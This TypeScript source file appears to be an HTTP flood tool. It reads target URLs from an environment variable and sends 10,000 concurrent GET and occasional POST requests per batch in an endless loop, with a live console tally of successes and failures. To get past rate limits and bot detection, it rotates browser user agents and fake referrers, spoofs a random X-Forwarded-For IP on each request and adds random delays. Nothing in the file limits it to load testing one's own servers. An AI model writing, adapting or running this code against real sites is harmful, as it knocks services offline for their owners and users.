// Load URLs from environment variable (comma-separated)
const URLS = (process.env.TARGET_URLS || '').split(',');
const REQUESTS = 10000;
const CONCURRENCY = 10000;

// List of common user agents
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
];

// List of common referrers
const REFERRERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.facebook.com/',
    'https://t.co/',
    'https://www.reddit.com/',
    'https://www.youtube.com/',
];

// Generate random IP-like string
const generateIP = () =>
    `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

// Get random item from array
const getRandomItem = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];

import chalk from 'chalk';

async function makeRequest(): Promise<boolean> {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);

        // Random target URL
        const targetUrl = getRandomItem(URLS);

        // Generate random headers
        const headers = {
            'User-Agent': getRandomItem(USER_AGENTS),
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            Referer: getRandomItem(REFERRERS),
            'X-Forwarded-For': generateIP(),
            'Cache-Control': 'no-cache',
            Pragma: 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            DNT: '1',
            'Upgrade-Insecure-Requests': '1',
            Connection: 'keep-alive',
        };

        // Add random delay before the request
        await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 1000)));

        const response = await fetch(targetUrl, {
            signal: controller.signal,
            headers,
            method: Math.random() > 0.9 ? 'POST' : 'GET',
        });

        clearTimeout(timeoutId);
        return response.ok; // Returns true if status is 2xx
    } catch (error) {
        return false;
    }
}

async function sendRequests(): Promise<void> {
    let successCount = 0;
    let failureCount = 0;
    const startTime = Date.now();

    // Clear console at the start
    console.clear();

    const requests = Array(REQUESTS)
        .fill(null)
        .map(() => makeRequest().then(success => {
            if (success) successCount++;
            else failureCount++;

            // Clear and update metrics (using console.clear instead of ANSI escape code)
            console.clear();
            console.log(`
${chalk.blue.bold('🚀 Requests in progress...')}
${chalk.yellow.bold('📊 Metrics:')}
${chalk.green('✅ Successful:')} ${chalk.green.bold(successCount)}
${chalk.red('❌ Failed:')} ${chalk.red.bold(failureCount)}
${chalk.cyan('⏱️  Time Elapsed:')} ${chalk.cyan.bold(((Date.now() - startTime) / 1000).toFixed(1) + 's')}
${chalk.magenta('📈 Success Rate:')} ${chalk.magenta.bold(((successCount / (successCount + failureCount)) * 100).toFixed(2) + '%')}
${chalk.blue('🎯 Target URLs:')} ${chalk.blue.bold(URLS.length)}
`);
        }));

    // Process requests in chunks to manage concurrency
    for (let i = 0; i < requests.length; i += CONCURRENCY) {
        const chunk = requests.slice(i, i + CONCURRENCY);
        await Promise.all(chunk);
    }

    // Clear console before final summary
    const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
    console.clear();
    console.log(`
${chalk.green.bold('✨ Batch Completed!')}
${chalk.yellow.bold('📊 Final Results:')}
${chalk.green('✅ Successful:')} ${chalk.green.bold(successCount)}
${chalk.red('❌ Failed:')} ${chalk.red.bold(failureCount)}
${chalk.cyan('⏱️  Total Time:')} ${chalk.cyan.bold(totalTime + 's')}
${chalk.magenta('📈 Success Rate:')} ${chalk.magenta.bold(((successCount / REQUESTS) * 100).toFixed(2) + '%')}
${chalk.blue('🎯 Target URLs:')} ${chalk.blue.bold(URLS.length)}
`);
}

// Infinite loop
async function main() {
    // Check if TARGET_URLS is provided and not empty after splitting
    const urls = (process.env.TARGET_URLS || '').split(',').filter(url => url.trim());
    if (urls.length === 0) {
        console.log('No valid target URLs provided. Please set TARGET_URLS environment variable.');
        process.exit(0);
    }

    // Update URLS constant with filtered values
    URLS.splice(0, URLS.length, ...urls);

    while (true) {
        await sendRequests();
        await new Promise((resolve) => setTimeout(resolve, 1000));
    }
}

main().catch(console.error);
